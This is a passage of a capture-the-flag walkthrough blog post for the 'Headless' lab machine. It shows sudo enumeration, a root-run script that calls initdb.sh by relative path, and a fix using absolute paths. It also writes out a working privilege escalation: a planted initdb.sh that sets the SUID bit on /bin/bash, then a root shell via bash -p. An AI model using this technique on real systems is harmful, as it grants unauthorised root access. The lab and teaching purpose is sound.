src="/assets/img/2024/2024-03-headless/first-flag.png" alt="first-flag.png" class="auto-resize"></p> <h1 id="system-enumeration">System enumeration</h1> <p>As always, checking for any <code class="language-plaintext highlighter-rouge">sudo</code> rights is a good place to start.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">whoami
</span>dvir
<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>dvir on headless:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User dvir may run the following commands on headless:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/syscheck

</code></pre></div></div> <p>In this case, the user can execute <code class="language-plaintext highlighter-rouge">/usr/bin/syscheck</code> as sudo with no password.</p> <p>Checking what the binary is reveals a bash script that needs elevated privileges to check some values and retrieve system information.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings /usr/bin/syscheck
<span class="c">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">exit </span>1
<span class="nv">last_modified_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/find /boot <span class="nt">-name</span> <span class="s1">'vmlinuz*'</span> <span class="nt">-exec</span> <span class="nb">stat</span> <span class="nt">-c</span> %Y <span class="o">{}</span> + | /usr/bin/sort <span class="nt">-n</span> | /usr/bin/tail <span class="nt">-n</span> 1<span class="si">)</span>
<span class="nv">formatted_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/date <span class="nt">-d</span> <span class="s2">"@</span><span class="nv">$last_modified_time</span><span class="s2">"</span> +<span class="s2">"%d/%m/%Y %H:%M"</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Last Kernel Modification Time: </span><span class="nv">$formatted_time</span><span class="s2">"</span>
<span class="nv">disk_space</span><span class="o">=</span><span class="si">$(</span>/usr/bin/df <span class="nt">-h</span> / | /usr/bin/awk <span class="s1">'NR==2 {print $4}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Available disk space: </span><span class="nv">$disk_space</span><span class="s2">"</span>
<span class="nv">load_average</span><span class="o">=</span><span class="si">$(</span>/usr/bin/uptime | /usr/bin/awk <span class="nt">-F</span><span class="s1">'load average:'</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"System load average: </span><span class="nv">$load_average</span><span class="s2">"</span>
<span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
  /usr/bin/echo <span class="s2">"Database service is not running. Starting it..."</span>
  ./initdb.sh 2&gt;/dev/null
<span class="k">else</span>
  /usr/bin/echo <span class="s2">"Database service is running."</span>
<span class="nb">exit </span>0
<span class="err">$</span>
</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">if</code> statement is particularly interesting. It checks if a script named <code class="language-plaintext highlighter-rouge">initdb.sh</code> is currently running. If it’s not running, it attempts to start this script and prints a message indicating it’s starting the database service. If it is running, it prints that the database service is running.</p> <p>The file can be created in the present working directory to impersonate the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script. If <code class="language-plaintext highlighter-rouge">/usr/bin/syscheck</code> is executed from the same directory to where the fake <code class="language-plaintext highlighter-rouge">initdb.sh</code> script is created, it will execute this file because it uses a relative path to locate and run <code class="language-plaintext highlighter-rouge">initdb.sh</code>.</p> <h2 id="relative-path-vs-absolute-path">Relative path vs. Absolute path</h2> <p>In the original script, the problematic part is:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
  ./initdb.sh 2&gt;/dev/null
<span class="k">else</span>
  /usr/bin/echo <span class="s2">"Database service is running."</span>

</code></pre></div></div> <p>Here, <code class="language-plaintext highlighter-rouge">./initdb.sh</code> refers to a relative path, which means it looks for <code class="language-plaintext highlighter-rouge">initdb.sh</code> in the current working directory.</p> <p>Here is a version of the script using absolute paths.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">last_modified_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/find /boot <span class="nt">-name</span> <span class="s1">'vmlinuz*'</span> <span class="nt">-exec</span> <span class="nb">stat</span> <span class="nt">-c</span> %Y <span class="o">{}</span> + | /usr/bin/sort <span class="nt">-n</span> | /usr/bin/tail <span class="nt">-n</span> 1<span class="si">)</span>
<span class="nv">formatted_time</span><span class="o">=</span><span class="si">$(</span>/usr/bin/date <span class="nt">-d</span> <span class="s2">"@</span><span class="nv">$last_modified_time</span><span class="s2">"</span> +<span class="s2">"%d/%m/%Y %H:%M"</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Last Kernel Modification Time: </span><span class="nv">$formatted_time</span><span class="s2">"</span>
<span class="nv">disk_space</span><span class="o">=</span><span class="si">$(</span>/usr/bin/df <span class="nt">-h</span> / | /usr/bin/awk <span class="s1">'NR==2 {print $4}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"Available disk space: </span><span class="nv">$disk_space</span><span class="s2">"</span>
<span class="nv">load_average</span><span class="o">=</span><span class="si">$(</span>/usr/bin/uptime | /usr/bin/awk <span class="nt">-F</span><span class="s1">'load average:'</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
/usr/bin/echo <span class="s2">"System load average: </span><span class="nv">$load_average</span><span class="s2">"</span>

<span class="c"># Absolute path used here</span>
<span class="nv">initdb_script</span><span class="o">=</span><span class="s2">"/opt/scripts/initdb.sh"</span>

<span class="k">if</span> <span class="o">!</span> /usr/bin/pgrep <span class="nt">-x</span> <span class="s2">"initdb.sh"</span> &amp;&gt;/dev/null<span class="p">;</span> <span class="k">then
  if</span> <span class="o">[</span> <span class="nt">-x</span> <span class="s2">"</span><span class="nv">$initdb_script</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    <span class="nv">$initdb_script</span> 2&gt;/dev/null
    /usr/bin/echo <span class="s2">"Database service started."</span>
  <span class="k">else</span>
    /usr/bin/echo <span class="s2">"Error: initdb.sh script not found or not executable."</span>
  <span class="k">fi
else</span>
  /usr/bin/echo <span class="s2">"Database service is running."</span>
<span class="k">fi</span>
</code></pre></div></div> <ol> <li> <strong>Absolute Path Definition</strong>: The path to <code class="language-plaintext highlighter-rouge">initdb.sh</code> is set as an absolute path (<code class="language-plaintext highlighter-rouge">/opt/scripts/initdb.sh</code>). This ensures that the script always attempts to execute the specific <code class="language-plaintext highlighter-rouge">initdb.sh</code> located in <code class="language-plaintext highlighter-rouge">/opt/scripts</code>, regardless of the current working directory.</li> <li> <strong>Check for Script Existence and Executability</strong>: Before attempting to execute <code class="language-plaintext highlighter-rouge">initdb.sh</code>, the script checks if the file exists and is executable (<code class="language-plaintext highlighter-rouge">-x</code>). This adds an additional layer of safety by ensuring that the script does not attempt to execute a non-existent or non-executable file, which could result in errors or security issues.</li> <li> <strong>Clear Error Messaging</strong>: In case the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script is not found or is not executable, the script clearly prints an error message. This helps in troubleshooting and ensures that script failures due to path issues are communicated clearly to the user or administrator.</li> </ol> <p>Using absolute paths like this not only mitigates the risk of unintended file execution but also enhances the script’s robustness by making its operation more predictable and secure.</p> <h1 id="privilege-escalation">Privilege escalation</h1> <p>Creating the <code class="language-plaintext highlighter-rouge">initdb.sh</code> file to execute <code class="language-plaintext highlighter-rouge">/bin/bash</code> results in the shell elevated to root privileges.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"chmod u+s /bin/bash"</span> <span class="o">&gt;</span> initdb.sh
<span class="nv">$ </span><span class="nb">chmod</span> +x initdb.sh
<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.06, 0.03, 0.00
Database service is not running. Starting it...
<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
<span class="nb">whoami
</span>root
<span class="nb">cat</span> /root/root.txt
f894b8ca49729b&lt;SNIP&gt;
</code></pre></div></div> <p><strong><code class="language-plaintext highlighter-rouge">echo "chmod u+s /bin/bash" &gt; initdb.sh</code></strong></p> <ul> <li>This writes a command into a script file (<code class="language-plaintext highlighter-rouge">initdb.sh</code>) that, when executed, will set the SUID bit on <code class="language-plaintext highlighter-rouge">/bin/bash</code>. Setting the SUID bit (<code class="language-plaintext highlighter-rouge">u+s</code>) on <code class="language-plaintext highlighter-rouge">/bin/bash</code> will allow any user to run Bash as the root user. As the <code class="language-plaintext highlighter-rouge">/usr/bin/syscheck</code> binary can be ran in the context of <code class="language-plaintext highlighter-rouge">sudo</code>, calling <code class="language-plaintext highlighter-rouge">initdb.sh</code> via this binary , means the encapsulated command will also be ran as <code class="language-plaintext highlighter-rouge">sudo</code>, and <code class="language-plaintext highlighter-rouge">/bin/bash</code> will have its SUID successfully modified.</li> </ul> <p><strong><code class="language-plaintext highlighter-rouge">chmod +x initdb.sh</code></strong></p> <ul> <li>Makes the <code class="language-plaintext highlighter-rouge">initdb.sh</code> script executable.</li> </ul> <p><strong><code class="language-plaintext highlighter-rouge">sudo /usr/bin/syscheck</code></strong></p> <ul> <li>Runs the binary the user has sudo rights over, which ends with the malicious <code class="language-plaintext highlighter-rouge">initdb.sh</code> script being called.</li> </ul> <p><strong><code class="language-plaintext highlighter-rouge">/bin/bash -p</code></strong></p> <ul> <li>Launches a new Bash shell with the SUID bit set (<code class="language-plaintext highlighter-rouge">-p</code>), running with root privileges because of the earlier <code class="language-plaintext highlighter-rouge">chmod u+s /bin/bash</code>.</li> </ul> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/hospital-walkthrough/">Hospital - Insecure File Uploads, Business Email Compromise, and kernel exploits.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/iclean-walkthrough/">IClean - XSS, SSTI, and Sudo abuse.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/codify-walkthrough/">Codify - Arbitraty code execution and stealing hashes.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/bizness-walkthrough/">Bizness - Authentication bypass and SSRF.</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/devvortex-walkthrough/">Devvortex - Unauthenticated Information Disclosure and password re-use.</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2024 . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>